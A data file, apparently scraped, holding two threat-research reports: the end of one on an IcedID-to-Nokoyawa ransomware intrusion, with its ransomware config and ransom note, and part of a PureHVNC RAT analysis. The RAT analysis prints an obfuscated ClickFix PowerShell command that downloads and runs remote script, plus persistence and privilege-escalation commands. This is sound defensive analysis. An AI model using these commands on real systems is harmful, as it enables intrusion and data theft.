used by Conti : AnyDesk can be used, either as an installed service (as we can see above) or it can use a portable version. The differences and limitations are written on the official site of AnyDesk . As we are dealing with the \u2018installed\u2019 version, it will leave certain artifacts related to the installed version on the system. Multiple people have written about AnyDesk artifacts, such as Inversecos or TylerBrozek , which help a lot during the forensic process related to Anydesk artifacts. For the ad_svc.trace we can find entries like this: info REDACTED gsvc 6600 11452 26 anynet.any_socket - Client-ID: 485343132 (FPR: 9805919074ee). info REDACTED gsvc 6600 11452 46 anynet.any_socket - Logged in from 152.89.196.49:61384 on relay a541c14e info REDACTED gsvc 10136 2256 2515 anynet.any_socket - Client-ID: 547283332 (FPR: 17e2ee445059). info REDACTED gsvc 10136 2256 2515 anynet.any_socket - :54241 on relay ffe9a90c. IP Usage ISP Country AnyDesk Client ID 152.89.196.49 AnyDesk Interactive Starcrecium Limited RU 485343132 185.29.9.162 AnyDesk Interactive DataClub SE 547283332 Exfiltration After the threat actors gained access to a file server in the domain, they quickly prepared this machine for exfiltration. This was performed by downloading the Filezilla FTP client installer using internet explorer on the server. The threat actors were so kind to use the sponsored version, to bring some additional PUP\u2019s as well: Shortly after, the threat actors connected from the file server, using FileZilla, to 45.155.204.5 via SSH and key exchange can be observed in the network traffic: IP Usage ISP Country SSH Info: 45.155.204.5 SSH for FileZilla 3NT Solutions LLP RU Hash : c561c2cdad206b6ed8469079e037e3f9 SSH Version : ssh-2.0-filezilla_3.63.2.1 FileZilla can leave behind some nice forensics artifacts (if the installation is not removed). Writing in this blog by Artifast , a nice overview can be seen. In this case, we were able to recover part of the .xml files resulting in the below correlation between the network data and the host data. While each separate source was already a good finding on its own, this combination leaves less room for guessing. Impact Thirty-four days after the first infection, and about 28 hours after the beginning of hands-on activity, the threat actors proceeded to their final actions, deploying Nokayawa ransomware. The variant of Nokoyawa was similar to those we\u2019ve already reported on . As in most ransomware related cases, before actual deployment, the threat actors looked around to gather information related to backup functionality and systems. In this case, the threat actors moved around between a file server and a backup server, making and viewing configurations, dropping and \u2018debugging\u2019 the ransomware and finally cleaning up. The threat actors started by using mmc.exe to look into the Local Group Policy by using gpedit.msc. Around 20 minutes later, the threat actors started executing the ransomware script on the file server. The ransomware files, in this case svchost.exe and an \u2018automation\u2019 file [REDACTED].1.bat , were delivered via the AnyDesk sessions as parent process. The batch script, [REDACTED].1.bat , launched the executable svchost.exe with a --config parameter, containing a base64 encoded string: { EXTENSION: \"NOKONOKO\", NOTE_NAME: \"NOKONOKO-readme.txt\", NOTE_CONTENT: \"<BASE64 ENCODED NOTEBLOB>\", ECC_PUBLIC: \"AHpyfaG1ftdE4NNQ0laC2825GOpTwUw5Y9+WEMkAAAC0Yd7VSOy7D5CxWhHH4pzSYdCXjpPXqEZ2X2r6kgEAAA==\", SKIP_DIRS: [ \"windows\", \"program files\", \"program files (x86)\", \"appdata\", \"programdata\", \"system volume information\" ], SKIP_EXTS: [ \".exe\", \".dll\", \".ini\", \".lnk\", \".url\" ], ENCRYPT_NETWORK: true, LOAD_HIDDEN_DRIVES: true, DELETE_SHADOW: true } After the execution on the file server, the threat actors moved to the backup server, where they repeated their interest in the Group Policy. On the backup server, they also opened the server configuration. There appeared to be a problem, as there was some \u2018file locking\u2019 in place, likely preventing access. The threat actors tried to circumvent these \u2018locks\u2019 by utilizing a tool called IOBit . This tool is capable of removing file locks. After this, the ransomware was deployed in the same manner as on the file server. However, there appeared to be a problem with the deployment. The threat actors started ProcessHacker and utilized notepad++ to likely fix something related to the ransomware execution. This is based on the fact that, the threat actors executed the ransomware binary 11 times on the backup server and afterwards returned and executed the ransomware a second time on the file server. After encrypting the back up server, the threat actors uninstalled the backup software using add/remove programs. In addition, notepad was used to view the deployed ransom note after the final execution on the file server. The NOTE_CONTENT (from above base64 configuration) appears to be base64 encoded again and decoded gives the following ransom note: Nokoyawa. If you see this, your files have been successfully encrypted and stolen. Don't try to search free decryption method. It's impossible. We are using symmetrical and asymmetric encryption. ATTENTION: - Don't rename encrypted files. - Don't change encrypted files. - Don't use third party software. You are risking irreversibly damaging the file by doing this. If you manage to keep things quiet on your end, this will never be known to the public. To reach an agreement you have 48 hours to visit our Onion Website. How to open Onion links: - Download TOR Browser from official website. - Open and enter this link: http://nokopay<REDACTED> - On the page you will see a chat with the Support. - Send your first message. Don't waste your time. Otherwise all your valuable and sensitive data will be leaked. Our websites are full of companies that doubted the fact of the data breach or it's extent. - http://nokoleakb76znymx443veg4n6fytx6spck6pc7nkr4dvfuygpub6jsid.onion/ - http://hl66646wtlp2naoqnhattngigjp5palgqmbwixepcjyq5i534acgqyad.onion/ - http://snatchteam.top The threat actors only deployed the ransomware on the two servers and did not perform a domain wide deployment. After the ransom of these two systems, the threat actor\u2019s activity ceased. Please consider leaving feedback on this report here . Timeline Diamond Model Indicators Atomic IcedID mrassociattes[.]com (174.138.188.6) aerilaponawki[.]com (193.149.129.131) klindriverfor[.]com (5.255.102.167) alishaskainz[.]com (dr) Cobalt Strike msc-mvc-updates[.]com (91.215.85.183) FileZilla File Exfiltration 45.155.204.5 Computed Contract_02_21_Copy#909.one 5f4d630ef00656726401b205ae4dc88f aa8f2d6d98aa535e05685076ca02f781c2aa6464 9c337d27dab65fc3f4b88666338e13416f218ab75c4b5e37cc396241c225efe8 COIm.jpg d1da347e78bf043e2dc61638e946c3da d87a3c22771b1106a1a52d96df7b2944d93fa184 1ab812f7d829444dc703eeb02ea0a955ec839d5e2a9b619d44ac09a91135cad1 GET_ID.bat a59a7916156c52f732b4c2e321facfe1 8c949a7769d16c285347f650ef2eedac01dc1805 eae2bce6341ff7059b9382bfa0e0daa337ea9948dd729c0c1e1ee9c11c1c0068 INSTALL.ps1 b1f5e4774aa79f643350218df61e33f6 f1e7994c6568f0182a60f64557c7793df5e550ed b378c2aa759625de2ad1be2c4045381d7474b82df7eb47842dc194bb9a134f76 agaloz.dll 76a1f94ed6499b99d2cc500998846875 ca14d61bcf038cda45199f54c7c452ad262a7c88 d6127d614309acbf2a630fe3fb0fda8e4079dcf2045f91aa400d179751d425f7 csrss.exe/Funa2.exe f927cd4f40c7a6dad769a8f9af771a8c 0fdfef7c9cc4305df81b006e898e1592aa822437 06bbb36baf63bc5cb14d7f097745955a4854a62fa3acef4d80c61b4fa002c542 svchost.exe 8800e6f1501f69a0a04ce709e9fa251c 72a1c9ea93d18309769d8be5cdb3daedf1cddcf5 3c9f4145e310f616bd5e36ca177a3f370edc13cf2d54bb87fe99972ecf3f09b4 Detections Network ET MALWARE Observed DNS Query to IcedID Domain (qoipaboni .com) ET MALWARE Win32/IcedID Request Cookie ET INFO Windows Powershell User-Agent Usage ETPRO INFO HTTP Request with Lowercase accept Header Observed ET MALWARE Cobalt Strike Malleable C2 (Unknown Profile) ET SCAN Behavioral Unusual Port 1433 traffic Potential Scan or Infection ET POLICY SMB2 NT Create AndX Request For an Executable File ET SCAN Behavioral Unusual Port 445 traffic Potential Scan or Infection ET POLICY HTTP traffic on port 443 (POST) ET POLICY SMB2 NT Create AndX Request For a DLL File - Possible Lateral Movement ET SCAN Potential SSH Scan OUTBOUND ET HUNTING Possible Powershell .ps1 Script Use Over SMB ET POLICY SMB2 NT Create AndX Request For a Powershell .ps1 File ET HUNTING Suspicious csrss.exe in URI ET INFO Executable Download from dotted-quad Host ET INFO Dotted Quad Host DLL Request Sigma Search rules on detection.fyi or sigmasearchengine.com DFIR Public Rules Repo : b26feb0b-8891-4e66-b2e7-ec91dc045d58 : AnyDesk Network 50046619-1037-49d7-91aa-54fc92923604 : AdFind Discovery 8a0d153f-b4e4-4ea7-9335-892dfbe17221 : NetScan Share Enumeration Write Access Check DFIR Private Rules: baa9adf9-a01c-4c43-ac57-347b630bf69e : Default Cobalt Strike Named Pipes a526e0c3-d53b-4d61-82a1-76d3d1358a30 : Silent Installation of AnyDesk RMM b526e0c3-d53b-4d61-82a1-76d3d1358a31 : AnyDesk RMM Password Setup via Command Line 624f1f33-ee38-4bbe-9f4a-088014e0c26b : IcedID Malware Execution Patterns 37948baa-5310-424c-bb18-b29c56be160f : Suspicious Execution of DLL with Unusual File Extensions Sigma Repo : 530a6faa-ff3d-4022-b315-50828e77eef5 : Anydesk Remote Access Software Service Installation 114e7f1c-f137-48c8-8f54-3088c24ce4b9 : Remote Access Tool - AnyDesk Silent Installation b52e84a3-029e-4529-b09b-71d19dd27e94 : Remote Access Tool - AnyDesk Execution b1377339-fda6-477a-b455-ac0923f9ec2c : Remote Access Tool - AnyDesk Piped Password Via CLI 065b00ca-5d5c-4557-ac95-64a6d0b64d86 : Remote Access Tool - Anydesk Execution From Suspicious Folder 9a132afa-654e-11eb-ae93-0242ac130002 : PUA - AdFind Suspicious Execution 903076ff-f442-475a-b667-4f246bcc203b : Nltest.EXE Execution 5cc90652-4cbd-4241-aa3b-4b462fa5a248 : Potential Recon Activity Via Nltest.EXE 0ef56343-059e-4cb6-adc1-4c3c967c5e46 : Suspicious Execution of Systeminfo 968eef52-9cff-4454-8992-1e74b9cbad6c : Reconnaissance Activity e568650b-5dcd-4658-8f34-ded0b1e13992 : Potential Product Class Reconnaissance Via Wmic.EXE fcc6d700-68d9-4241-9a1a-06874d621b06 : Suspicious File Created Via OneNote Application d5601f8c-b26f-4ab0-9035-69e11a8d4ad2 : CobaltStrike Named Pipe 811e0002-b13b-4a15-9d00-a613fce66e42 : PUA - Process Hacker Execution d5866ddf-ce8f-4aea-b28e-d96485a20d3d : Files With System Process Name In Unsuspected Locations 96036718-71cc-4027-a538-d1587e0006a7 : Windows Processes Suspicious Parent Directory c8557060-9221-4448-8794-96320e6f3e74 : Windows PowerShell User Agent JoeSecurity Repo : 200068 : Execute DLL with spoofed extension Yara https://github.com/The-DFIR-Report/Yara-Rules/blob/main/19772/19772.yar MITRE Credentials In Files - T1552.001 Data Encrypted for Impact - T1486 Data from Network Shared Drive - T1039 Domain Groups - T1069.002 Domain Trust Discovery - T1482 Exfiltration Over Alternative Protocol - T1048 File and Directory Discovery - T1083 Indicator Removal - T1070 Ingress Tool Transfer - T1105 LSASS Memory - T1003.001 Malicious File - T1204.002 Masquerade File Type - T1036.008 Masquerading - T1036 Network Service Discovery - T1046 Phishing - T1566 PowerShell - T1059.001 Process Discovery - T1057 Process Injection - T1055 Regsvr32 - T1218.010 Remote Access Software - T1219 Remote Desktop Protocol - T1021.001 Remote System Discovery - T1018 Rundll32 - T1218.011 Scheduled Task - T1053.005 Security Software Discovery - T1518.001 System Information Discovery - T1082 System Owner/User Discovery - T1033 Web Protocols - T1071.001 Windows Command Shell - T1059.003 Windows Service - T1543.003 Internal case #19772 Share this: Share on X (Opens in new window) X Share on LinkedIn (Opens in new window) LinkedIn Share on Reddit (Opens in new window) Reddit Share on Facebook (Opens in new window) Facebook Share on WhatsApp (Opens in new window) WhatsApp Related Post navigation Threat Brief: WordPress Plugin Exploit Leads to Godzilla Web Shell, Discovery & New CVE From IcedID to Dagon Locker Ransomware in 29 Days Search for: Type your email\u2026 Subscribe Reports Threat Intelligence Detection Rules DFIR Labs Proudly powered by WordPress | Copyright 2023 | The DFIR Report | All Rights Reserved Go Top",
    "expected_count": 24
  },
  {
    "url": "https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/",
    "title": "Untitled Article",
    "content": "CONTACT US DISCLOSURE POLICY CHECKPOINT.COM UNDER ATTACK? Latest Publications CPR Podcast Channel Web 3.0 Security Intelligence Reports Resources ThreatCloud AI Threat Intelligence & Research Zero Day Protection Sandblast File Analysis About Us SUBSCRIBE SUBSCRIBE CATEGORIES Android Malware 23 Artificial Intelligence 4 ChatGPT 3 Check Point Research Publications 442 Cloud Security 1 CPRadio 44 Crypto 2 Data & Threat Intelligence 1 Data Analysis 0 Demos 22 Global Cyber Attack Reports 394 How To Guides 13 Ransomware 3 Russo-Ukrainian War 1 Security Report 1 Threat and data analysis 0 Threat Research 173 Web 3.0 Security 11 Wipers 0 Under the Pure Curtain: From RAT to Builder to Coder September 16, 2025 https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/ Research by: Antonis Terefos ( @Tera0017 ) Key Points Check Point Research conducted a forensic analysis of a ClickFix campaign that lured victims with fake job offers that resulted in an eight-day intrusion. The threat actor deployed multiple tools, including a Rust Loader , PureHVNC RAT , and the Sliver command-and-control framework. In this publication, we analyzed the associated files, providing one of the most comprehensive analyses of PureHVNC RAT , including its complete set of commands and plugins. During communication with the command and control server, the bot received three GitHub URLs containing supporting files for specific PureHVNC functionalities. Analysis confirmed that both the URLs and the associated GitHub accounts were directly linked to the developer of the Pure malware family. Where previously little to no information was known about PureCoder , this publication sheds light on the developer\u2019s timezone of operation (UTC+0300) and potential countries of residence. This lead may enable further intelligence gathering by relevant agencies. Further investigation led to the discovery of a PureRAT builder , revealing insights into the RAT\u2019s capabilities and highlighting features linked to PureCrypter , another tool developed by PureCoder , the author behind the Pure malware suite. Introduction The Pure malware family is a suite of malicious tools developed and sold by the author known as PureCoder . This suite includes PureHVNC RAT (a remote administration tool and predecessor to PureRAT ), PureCrypter (a malware obfuscator), PureLogs (a stealer/logger), and several other tools. The malicious software is advertised and distributed through underground forums, Telegram channels, and dedicated websites. These products are often combined to maximize their effectiveness across a wide range of malicious operations. While PureCoder is responsible for building and maintaining the malware ecosystem, cybercriminal customers primarily use these tools to conduct campaigns. In 2025, there has been a noticeable increase in the use of Pure malware products, with threat actors distributing them through various methods, including malspam, phishing websites, and the ClickFix technique. During a Check Point Incident Response (IR) engagement, our team investigated and contained an eight-day intrusion. The threat actor distributed a Rust loader, which deployed PureHVNC RAT with campaign IDs 2a and amazon3 . The attacker lured the victim through fake job advertisements, allowing the attacker to execute malicious PowerShell code through the ClickFix phishing technique. The RAT\u2019s Command and Control Server (C&C) has been observed to deliver three GitHub URLs to infected victims and download the related files. These downloaded files support various commands used by PureHVNC RAT and were determined to be part of the Pure development and operation infrastructure rather than the threat actor itself. As a result, the GitHub accounts involved were attributed to the developer of Pure malware families, PureCoder . While limited information is currently available about the author of these products, analysis of the associated GitHub accounts revealed a timezone of operation set to UTC+0300 , which corresponds to several countries, including Russia. ClickFix Campaign & Forensics Artifacts ClickFix is a social engineering phishing technique in which victims are presented with deceptive instructions designed to trick them into running a malicious command. In this campaign, the victim was lured to the ClickFix phishing page through fake job offers. Upon visiting the page, a PowerShell command was automatically copied to their clipboard, delivering a malicious JavaScript file. During the eight-day intrusion, the attacker used malicious JavaScript files , deployed two instances of PureHVNC RAT , established persistence on the victim\u2019s system, and finally executed the Sliver Command and Control (C2) framework. Figure 1 \u2014 Infection Chain. Infection Day 1 \u2013 ClickFix & PureHVNC During the first moments of the initial access, we observe the majority of interaction from the threat actor dropping JavaScript files and the first version of PureHVNC RAT. The victim was lured through fake job offers, and upon visiting the malicious ClickFix website, a PowerShell command was automatically copied to their clipboard. Figure 2 \u2014 ClickFix prompt. The page instructed the user to paste and execute the command. If executed, the command downloaded and ran a malicious JavaScript file , initiating the infection chain. Copied PowerShell command: powershell -c \"$j=$env:TEMP+'\\a.js';sc $j 'a=new ActiveXObject(\\\"MSXML2.XMLHTTP\\\");a.open(\\\"GET\\\",\\\"63381ba/kcilc.ellrafdlucolc//:sptth\\\".split(\\\"\\\").reverse().join(\\\"\\\"),0);a.send();eval(a.responseText);';wscript $j\" Pr\u0435ss Ent\u0435r The command and control server responded with malicious JavaScript code, which created a malicious LNK file in the Startup Folder and granted itself persistence to the machine. The malicious JavaScript file is obfuscated, and each day, it contacts a different command and control server and waits for further instructions. function getURL() { var C2_domain_list = ['stathub[.]quest', 'stategiq[.]quest', 'mktblend[.]monster', 'dsgnfwd[.]xyz', 'dndhub[.]xyz']; var current_datetime = new Date().getTime(); var no_days = getDaysDiff(0, current_datetime); return 'https://' + getListElement(C2_domain_list, no_days) + '/Y/?t=' + current_datetime + '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime); } The JavaScript delivers the first version of PureHVNC RAT with command and control 54[.]197.141.245 and campaign ID 2a . Infection Day 2 \u2013 Rust Loader & PureHVNC During the second day of the infection, the threat actor deployed a newer version of PureHVNC RAT packed with a Rust Loader and Inno Setup, an open-source installation builder for Windows applications. This Rust Loader that deploys PureHVNC RAT is dropped in %APPDATA%\\Microsoft\\SystemCertificates\\9TwinAPIInterop.pfx and contains no differences with the first version, the only change appears to be the campaign ID amazon3 . PureHVNC RAT Configuration: { \"C&C\": \"54.197.141.245\", \"ports\": [443, 10443], \"certificate\": \"MIIE4jCCAsqgAwIBAgIQAPKOllxpzWEf7Cig2iwQUTANBgkqhkiG9w0BAQ0FADASMRAwDgYDVQQDDAdXd2ZwaHZiMCAXDTI0MDkxNTEyNDUwN1oYDzk5OTkxMjMxMjM1OTU5WjASMRAwDgYDVQQDDAdXd2ZwaHZiMIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA3Qm+O4ZX8e7qnzb7AcS+MKuMmNan06HgF1tV3zC92tiL/QylCy3TfZ1GQmut+cOfuZby9uYAyMF74uxtwpFpr6pzL4ps3HxpuxBrvAcRsUKVShpQzGOTMwlJWJj7nDX1Tn/PIr9g55C7jTF/k93grdGN38EAYQSd75gxhZ7sddCZFuBy6Bdt21URknipN9N3y/dlDO+qBZmbVhGGEqZ1HrVD2RpmKKEO6OZu4XJHLrn1EsjgxyM0ifb7P38bR/cDB2PxzOqGRZ/Snhg5Bw/uG82+twYkp6CxVRH59yamlHp9qRF4vRFLk08xZ0+lRkQV4BrEWbA60omIp3XDdnMOPFZnqHUMTBTZ871LE782VF34xM5QdIA2r6QjqNyKSymb/lMcLJEhlJ+DEf05Y20lE9nJTn/ioMKO/ilszJOhu8NS43g+torPCEOvDldBfxtgcp4w+SXXLfUi3+p/326JXghRpqZUQ99VaH/ucT4rP9CcSjIqlCymPuAhOZmRDyMAcWuzsz/1STgZ8fxP0DVprdpTLvN9n+esMPYHRECUlaZLdn9x9AmZARbMatOdAzH8LgQTG02ecVS/pEugUVg7Ipxn6pWqjK+NSFNr1kxCYI5UqZK50CdINoKM8+frA7gAl3ohnY4bRK6bFioaCCcCZJF7FaJJh+EDs/CQ6KcLpnkCAwEAAaMyMDAwHQYDVR0OBBYEFB9jTlNea5ZsJd7ClDh/cepkFXZZMA8GA1UdEwEB/wQFMAMBAf8wDQYJKoZIhvcNAQENBQADggIBAH3nFnvuPEufM3BwPNfhgs5RkPPXk2pG9cTznxER3h37kR3jguEnq2wL7yYA2D30XA8tJv7+CPZ/IrtSC0OSyEmw8a5FoHtno22e5Dtq81FY4c8kFTS0p39mtAEtitAGehMyE6K3X0LgvNaxWwbdL9rcko62msxqKRw3fxaFjTNK+tl5H6T8jXH5VMqEd0eiiK5ySanLkiy+CfYJnyqBoICYW4r1W/o65ibgxzPoOzcbod4UG9O6YwDqMDN8JlQDQTl7gZLitCRcaBZQynINF2yZwZYirdWqK0X3fhQLluoZ9zXhc5rb3UM5+QvP9p/ZaUOIZ0m18vjVcnz6Zo9N60K93u5Z/IzBcd8gM1Wp3dtDruekbjdXs8b+txMDFSy56ZPBFLJhWO4xpGt172ZMp6Du9sMAWDaDTfPvZWprE5WjCk4fltMQU0DGbPmP1il3XLtqVvPiLvuAccrbL9wkvlvDKgjqUpYjXsdFOT5unXiYc1eEDW4HIWNJcIw2J4oz8I2AlwQ+exVTEArQc8G3fNbMsvZD7CtSVJKqZLSkAfoki3Zrs/fIFTGGNzQ/Vbb01K7k7s2mAQ4Mr1JjNh/ZwlTdubKZp+jbARrhDvvdPISupSo0KDKBjwkY2tcGw/aTsYKdNywDn8VqIvLjHhDKG4vMm7FYoLMdEWIXNyvP1oJ2\", \"campaign_id\": \"amazon3\", \"install_path\": \"APPDATA\", \"mutex\": \"aa05be285061\" } Infection Day 8 \u2013 Sliver Implant After mostly staying inactive for more than six days, possibly to verify that the infected machine is a real target rather than a sandbox environment, the threat actor delivered a Sliver implant with C&C hxxps://jq-scripts.global.ssl[.]fastly[.]net . Sliver then delivered and executed a PowerShell Script that requested the user\u2019s password in a prompt and stored the credentials at %ProgramData%/<domain>_<username>_cred.txt . Figure 3 \u2014 PowerShell User-Credential Theft Script. Rust Loader \u2013 Technical Analysis The malicious loader is a DLL file developed in Rust programming language and is executed using LOLBin regsvr32. The malicious functionality lies in the function exports DllRegisterServer and DllUnregisterServer , which contains the same piece of code. String Decryption The malware contains encrypted strings that are decrypted on demand using the ChaCha20-Poly1305 algorithm. The decryption key is generated by the XOR of two hardcoded values embedded in the binary: Value 1: 4a01d45563d802fee5593a21f1b216aeed83c4dff50fa6a31391ff73feb29dbd Value 2: bf83184822bf184536b50dff4758edd638b59cb82a06ee019b62b0bce33d07b5 Chacha20-Poly1305 Key: f582cc1d41671abbd3ec37deb6eafb78d5365867df0948a288f34fcf1d8f9a08 Anti-analysis Techniques The first anti-analysis techniques monitor the running processes and try to identify various processes related to antivirus and security software, debuggers, reverse engineering tools and monitoring tools. The malware detected antivirus processes from Bitdefender, ESET, Kaspersky, Ad-Aware, and 360 Total Security. Blacklisted processes: \"bdservicehost.exe\", \"bdredline.exe\", \"aylaunch.exe\", \"egui.exe\", \"360Safe.exe\", \"zhudongfangyu.exe\", \"HipsDaemon.exe\", \"ekrn.exe\", \"eguiProxy.exe\", \"avp32.exe\", \"avpcc.exe\", \"avpm.exe\", \"avpdos32.exe\", \"avp.exe\", \"adawareservice.exe\", \"ksdumper.exe\", \"decoder.exe\", \"dnspy.exe\", \"dbgx.shell.exe\", \"ilspy.exe\", \"ollydbg.exe\", \"x32dbg.exe\", \"x64dbg.exe\", \"gdb.exe\", \"idaq.exe\", \"idag.exe\", \"idaw.exe\", \"ida64.exe\", \"idag64.exe\", \"idaw64.exe\", \"idaq64.exe\", \"windbg.exe\", \"immunitydebugger.exe\", \"windasm.exe\", \"scylla.exe\", \"scyllahide.exe\", \"cheatengine.exe\", \"pe-bear.exe\", \"ollyice.exe\", \"radare2.exe\", \"ghidra.exe\", \"sysanalyzer.exe\", \"xperf.exe\", \"procdump.exe\", \"dbgview.exe\", \"apimonitor.exe\", \"pe-sieve64.exe\", \"pe-sieve32.exe\", \"pe-moneta.exe\" The second anti-analysis technique includes a list of API functions specifically present in Microsoft\u2019s Windows Defender Malware Analysis Emulator. This technique addresses the differences between the Windows libraries and the virtual ones, which contain more API calls specifically related to the emulated environment. Blacklisted APIs: \"MpVmp32Entry\", \"NtControlChannel\", \"ObjMgr_ValidateVFSHandle\", \"ThrdMgr_GetCurrentThreadHandle\", \"ThrdMgr_SaveTEB\", \"ThrdMgr_SwitchThreads\", \"VFS_CopyFile\", \"VFS_DeleteFile\", \"VFS_DeleteFileByHandle\", \"VFS_FileExists\", \"VFS_FindClose\", \"VFS_FindFirstFile\", \"VFS_FindNextFile\", \"VFS_FlushViewOfFile\", \"VFS_GetAttrib\", \"VFS_GetHandle\", \"VFS_GetLength\", \"VFS_MapViewOfFile\", \"VFS_MoveFile\", \"VFS_Open\", \"VFS_Read\", \"VFS_SetAttrib\", \"VFS_SetCurrentDir\", \"VFS_SetLength\", \"VFS_UnmapViewOfFile\", \"VFS_Write\", \"MpAddToScanQueue\", \"MpCreateMemoryAliasing\", \"MpCallPostEntryPointCode\", \"MpCallPreEntryPointCode\", \"MpDispatchException\", \"MpExitThread\", \"MpFinalize\", \"MpGetCurrentThreadHandle\", \"MpGetCurrentThreadId\", \"MpGetLastSwitchResult\", \"MpGetPseudoThreadHandle\", \"MpGetSelectorBase\", \"MpGetVStoreFileHandle\", \"MpHandlerCodePost\", \"MpIntHandler\", \"MpIntHandlerParam\", \"MpIntHandlerReturnAddress\", \"MpNtdllDatatSection\", \"MpReportEvent\", \"MpReportEventEx\", \"MpReportEventW\", \"MpSehHandler\", \"MpSetSelectorBase\", \"MpStartProcess\", \"MpSwitchToNextThread\", \"MpSwitchToNextThread_WithCheck\", \"MpSwitchToNextThread_NewObjManager\", \"MpTimerEvent\", \"MpTimerEventData\", \"MpUfsMetadataOp\", \"MpValidateVFSHandle\", \"MpVmp32FastEnter\" If any of those anti-analysis techniques detects that the malware is being analyzed and monitored under an emulated or sandbox environment, it will sleep for a random time between 10 to 30 minutes, by executing the command cmd /c timeout /t {random_time} >null , once awake, if still running in the monitored environment, it reruns the anti-analysis process, and if it is again detected, it falls into a random sleep again. The Rust Loader requires that it be executed with a specific command line parameter that, if it is not present, terminates its execution. The malware retrieves the parameters passed to the process and tries to find the parameter /i:--type=renderer . As a final anti-analysis and evasion technique, immediately following the successful decryption of its payload, the malware actively implements an AMSI bypass by injecting a hook into the native LdrLoadDll function within ntdll.dll . This hook intercepts attempts to load the amsi.dll library\u2014responsible for the Windows Anti-malware Scan Interface\u2014and effectively prevents it from being loaded into the process. By doing so, the malware disables AMSI\u2019s runtime scanning capabilities, thereby evading detection and analysis by security products that rely on AMSI for real-time malware inspection. Figure 4 \u2014 LdrLoadDll Hooked function. Persistence The malware checks if the process is not running with administrative privileges, then executes the PowerShell command below to grant the malware higher privileges. \"powershell\" -Command \" while ($true) { try { Start-Process -FilePath 'cmd.exe' ` -Verb runas ` -ArgumentList '/c start \"\" /B \"regsvr32.exe\" {MALWARE} /i:--type=renderer'; exit } catch {} } \" This PowerShell will try to execute the malicious DLL with administrative privileges in an infinite loop until the User accepts the UAC (User Account Control) prompt. Once the prompt is accepted, the process terminates itself, and the infection continues with the one that obtained higher privileges. The loader, to avoid being executed twice, creates a Mutex MistyRoseNavy and then executes a PowerShell command, which will maintain persistence to the system via scheduled tasks. The first PowerShell command will try to see if any Scheduled Task is already registered in the system. \"powershell\" -Command \" if ( Get-ScheduledTask | Where-Object { $_.Actions.Execute -eq 'regsvr32' -and $_.Actions.Arguments -eq '/s /i:--type=renderer \\\"%APPDATA%\\Microsoft\\SystemCertificates\\{MALWARE}\\\"' } ) { exit 0 } else { exit 1 } \" If not, it will proceed to create persistence on the infected machine. The Task name and path were made to mimic a Google Updater: Register-ScheduledTask ` -Action ( New-ScheduledTaskAction ` -Execute \"regsvr32\" ` -Argument \"/s /i:--type=renderer \"%APPDATA%\\Microsoft\\SystemCertificates\\{MALWARE}\"\" ) ` -Trigger ( New-ScheduledTaskTrigger ` -Once -At (Get-Date).AddMinutes(1) ` -RepetitionInterval (New-TimeSpan -Minutes 1) ) ` -TaskName 'GoogleUpdaterTaskSystem196.6.2928.90.{FD10B0DF-9A2C-41C2-B9E7-3C3C6F193A83}' ` -TaskPath '\\GoogleSystem\\GoogleUpdater' ` -Description 'GoogleUpdater Task System 196.6.2928.90' ` -Settings ( New-ScheduledTaskSettingsSet ` -AllowStartIfOnBatteries ` -DontStopIfGoingOnBatteries ` -ExecutionTimeLimit 0 ` -DontStopOnIdleEnd ) ` -RunLevel Highest The execution of the above script will be performed by running it as a PowerShell over stdin , executing first the below command and writing into a Pipe WriteFileEx the persistence PowerShell script. PowerShell.exe -NoProfile -NonInteractive -Command - Payload Decryption & Execution The payload is embedded inside the Rust binary and is decrypted using a simple XOR with a 32-byte key. Figure 5 \u2014 Payload decryption routine. Later, the malware will validate the decrypted value, which will determine the next step. The validation occurs by XORing the decrypted bytes and generating a hash value. Figure 6 \u2014 Hash generation. This hash value is further processed and compared with the value 0x6. During this function, we also observe the hexadecimal value 0xDEADBEEF even though it does not affect the output, which appears to be used solely as a marker. Figure 7 \u2014 Hash validation. The next step, the malware checks if the decrypted payload is bigger than 1 KB (1024 Bytes), and only if so, proceeds further with the infection, otherwise, it terminates itself. At this stage, the malware has already hooked LdrLoadDll successfully bypasses AMSI loading. Figure 8 \u2014 Size check. As the last step, the Rust Loader creates a heap, copies the decrypted payload buffer into it, and executes the shellcode. Figure 9 \u2014 Shellcode NOP and CALL instruction. The buffer contains a .NET payload, which is executed via the shellcode. Once the .NET crypter decrypts the final payload using AES and decompresses it using Gzip , it is identified as PureHVNC . Figure 10 \u2014 Deobfuscated .NET Assembly Explorer. PureHVNC RAT \u2013 Technical Analysis PureHVNC is a product of the Pure family of malicious software developed by PureCoder . The malware provides HVNC capabilities (Hidden Virtual Network Computing), which allows an attacker to control an infected machine without the session being visible to the infected user. The analyzed malware contains obfuscated strings and function calls that are dynamically decrypted. By using NETReactorSlayer , we can obtain a cleaner version of this malware. Configuration The malware configuration is protobuf s erialized , Gzip compressed, and Base64 encoded. The reverse process retrieves the malware configuration, which contains execution configurations such as the command and control server, port number and mutex name. Figure 11 \u2014 Malware Configuration. The deserialization of the decompressed buffer can be done using the protod tool, which gives the following output. C:\\> protod --hex b202c30d0a0e35342e3139372e3134312e32343510bb0310cb511a880d4d494945346a434341737167417749424167495141504b4f6c6c78707a57456637436967326977515554414e42676b71686b69473977304241513046414441534d52417744675944565151444441645864325a7761485a694d434158445449304d446b784e5445794e4455774e316f59447a6b354f546b784d6a4d784d6a4d314f545535576a41534d52417744675944565151444441645864325a7761485a694d494943496a414e42676b71686b6947397730424151454641414f43416738414d49494343674b434167454133516d2b4f345a58386537716e7a62374163532b4d4b754d6d4e616e3036486746317456337a43393274694c2f51796c43793354665a3147516d75742b634f66755a627939755941794d463734757874777046707236707a4c34707333487870757842727641635273554b56536870517a474f544d776c4a574a6a376e445831546e2f5049723967353543376a54462f6b3933677264474e333845415951536437356778685a37736464435a4675427936426474323155526b6e69704e394e33792f646c444f2b71425a6d625668474745715a31487256443252706d4b4b454f364f5a7534584a484c726e3145736a6778794d306966623750333862522f6344423250787a4f7147525a2f536e68673542772f754738322b7477596b70364378565248353979616d6c487039715246347652464c6b3038785a302b6c526b51563442724557624136306f6d4970335844646e4d4f50465a6e7148554d5442545a3837314c4537383256463334784d3551644941327236516a714e794b53796d622f6c4d634c4a45686c4a2b44456630355932306c45396e4a546e2f696f4d4b4f2f696c737a4a4f6875384e533433672b746f725043454f76446c644266787467637034772b5358584c665569332b702f3332364